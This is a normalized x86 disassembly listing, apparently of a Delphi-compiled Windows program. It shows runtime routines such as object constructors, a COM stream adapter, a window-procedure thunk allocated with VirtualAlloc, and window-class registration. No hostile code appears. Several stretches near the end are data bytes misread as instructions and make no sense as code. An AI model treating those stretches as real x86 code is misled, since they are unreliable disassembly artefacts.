call sub_4167c8
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_416754
sub_41e0ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_416824
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4166b4
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_416844
sub_41e100
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41e09c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41e070
mov cl 0x1
mov edx ebx
call sub_41e100
inc edi
dec ebp
jne r-xdata
sub_41e150
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4050fc
mov edx esp
mov eax esi
call sub_404238
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41e198
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41e1c0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41e208
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_404018
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41e268
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41e28c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41e2d4
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
mov edx esi
call sub_41e50c
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_41e33c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41e50c
mov edx ebx
mov eax esi
call sub_41e500
sub_41e380
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41da5c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41e3c4
push ebx
push esi
push edi
call sub_404330
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41daa8
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
cmp [ edi + 0x50 ] 0x0
je r-xdata
mov edx edi
call sub_41dd70
lea eax [ edi + 0x50 ]
call sub_40f8bc
test bl bl
jle r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042d8
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4168b0
mov edx eax
mov eax edi
call sub_41e50c
sub_41e42c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41dd8c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41e458
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41e474
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41e490
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4167c8
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41e50c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4166b4
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4167c8
cmp ebp eax
jne r-xdata
sub_41e54c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41dd70
mov edx ebx
call sub_41db30
sub_41e578
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov [ edi + 0xc ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41e5c4
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403f64
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_41e5fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41e64b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41e664
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41e6b3
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41e6cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41e736
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41e750
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41e799
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_419344
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41e7b4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_406b68
xor eax eax
push ebp
push sub_41e9a7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor eax eax
push ebp
push sub_41e980
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_402d28
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41e96f
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_402d44
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov [ ebp - 0x10 ] esi
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_404884
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9ae
lea eax [ ebp + 0xc ]
call sub_406af4
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_404884
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41e9ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41ea4f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41ea80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_416b90
mov edi eax
xor eax eax
push ebp
push sub_41ead5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eadc
mov eax [ rw-data ]
call sub_416bf4
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4167c8
call sub_403f64
inc esi
dec ebx
jne r-xdata
sub_41eaf4
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41eb1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_402f9c
mov edx sub_41eaf4
lea eax [ esi + 0x5 ]
call sub_41eb14
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41eb14
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41ebd8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_407db8
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41eb1c
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41ec8c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41ebb4
sub_41ecb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41ed58
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed5f
retn
mov eax [ rw-data ]
call sub_415fb0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41ea80
xor edx edx
xor eax eax
call sub_41a3e0
mov eax rw-data
call sub_40f8bc
call sub_40710c
lea eax [ eax + 0xc ]
call sub_40f8bc
mov eax rw-data
call sub_40f8bc
mov eax rw-data
call sub_406af4
mov eax sub_41eaec
call sub_40698c
mov eax rw-data
call sub_40f8bc
call sub_41d214
mov eax rw-data
call sub_40f8bc
mov eax rw-data
call sub_406af4
sub_41ed68
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr ch 0x41
add [ eax + eax ] dl
add [ eax ] al
sub_41ed8d
inc eax
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x66 ] cl
inc ecx
add al dh
inc ecx
add ah ah
out dx al
inc ecx
add [ esi + 0x671c0041 ] bl
inc ecx
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi gs
inc ecx
add [ eax ] cl
add [ eax ] al
add ah cl
sbb dh ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 8 ] ah
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + edx + 0x41ac0040 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + ebp * 8 + 0x41 ] ch
add [ eax - 0x4fffbfce ] dl
out dx eax
inc ecx
add [ edi + ebp * 8 + 0x540c0041 ] bl
dec edi
jb r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
or al 0x80
sti
add dh [ ebp + 0x7 ]
mov eax edi
call sub_403f64
mov ecx ebx
mov edx edi
mov eax esi
call sub_416a34
pop edi
pop esi
pop ebx
retn
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0x8000408d
out dx al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 8 + 0x80041 ] cl
add [ eax ] al
int3
sub_41ee5d
in eax dx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + ebp * 8 + 0x41 ] ch
add al dl
out dx eax
inc ecx
add [ eax - 0x63ffbe11 ] dh
out dx eax
inc ecx
add [ esi ] al
push esp
push ebx
je r-xdata
or al 0x80
sti
add dh [ ebp + 0x7 ]
mov eax edi
call sub_403f64
mov ecx ebx
mov edx edi
mov eax esi
call sub_416a34
pop edi
pop esi
pop ebx
retn
arpl [ ebx - 0x70 ] bp
sub_41ee94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41ef28
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41ef6c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_41efb0
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4166b4
mov eax esi
pop esi
pop ebx
retn
sub_41f0c4
unpckhps xmm1 [ ecx + 0x53 ]
jo r-xdata
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0xf0847265
inc ecx
add [ ecx ] al
and al 0x22
jpo r-xdata
or eax [ eax ]
add [ ebx - 0x6162b40 ] al
or eax [ eax ]
je r-xdata
mov eax eax
dec esp
int1
inc ecx
scasb [ edi ]
push ds
adc eax [ ebx - 0x46 ]
salc
cmp al 0x32
clc
div [ eax - 0x7b ]
or [ eax + 0x65 ] ecx
insb
jo r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_404018
test al al
je r-xdata
rcl ah 0xe9
int 0xa
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
insd
inc ebp
js r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
add ah bh
inc eax
outsb
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_406b68
xor eax eax
push ebp
push sub_41fdbf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
jmp r-xdata
jo r-xdata
outsd
outsb
lea eax [ eax ]
int3
jae r-xdata
pop ebx
pop ebp
retn 0xc
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_406b0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fdc6
lea eax [ ebx + 0xc ]
call sub_406af4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_41fd4f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ ebx - 0x2bfbdbbc ] al
jmp r-xdata
imul ebp [ edi + 0x6e ] 0xcc00408d
add eax 0xffffffd8
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 + 0x41 ] cl
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add bh bh
dec [ ebx + 0x41f14cc0 ]
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x24 ]
mov edx ebx
call sub_404e98
mov eax [ eax + 0x20 ]
retn
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd56
lea eax [ ebp - 0x8 ]
call sub_406af4
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_41eed0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_406b0c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_406b38
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_41f1bb
add eax 0xffffffd4
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
